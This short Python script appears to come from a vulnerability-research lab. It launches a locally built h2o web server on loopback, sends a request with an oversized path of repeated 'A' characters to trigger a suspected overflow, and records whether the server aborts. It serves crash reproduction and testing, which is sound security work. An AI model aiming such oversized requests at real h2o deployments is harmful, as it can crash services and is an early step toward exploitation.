#!/usr/bin/env python3
"""Throwaway: run pinned plain h2o on loopback, send long wire request, capture abort."""
import socket
import subprocess
import time
import urllib.request

ROOT = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell"
PORT = 17996
n = int(__import__("sys").argv[1]) if len(__import__("sys").argv) > 1 else 5000
path = "/" + "A" * n

with open(f"{ROOT}/live/plain-smash-{PORT}.out", "wb") as out:
    proc = subprocess.Popen(
        [f"{ROOT}/src/vuln/build-plain/h2o", "-c", f"{ROOT}/live/plain-redirect-min-{PORT}.conf"],
        stdout=out, stderr=subprocess.STDOUT,
    )
    for _ in range(100):
        try:
            s = socket.create_connection(("127.0.0.1", PORT), 0.2)
            s.close()
            break
        except OSError:
            time.sleep(0.1)
    else:
        print("SERVER_NOT_READY")
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{PORT}{path}", timeout=10) as r:
            print("HTTP", r.status)
    except Exception as e:
        print("REQUEST_FAILED", repr(e))
    time.sleep(1)
    alive = proc.poll() is None
    print("ALIVE", alive, "RC", proc.poll())
    if alive:
        proc.kill()
    proc.wait()
print("--- server output ---")
print(open(f"{ROOT}/live/plain-smash-{PORT}.out", errors="replace").read())
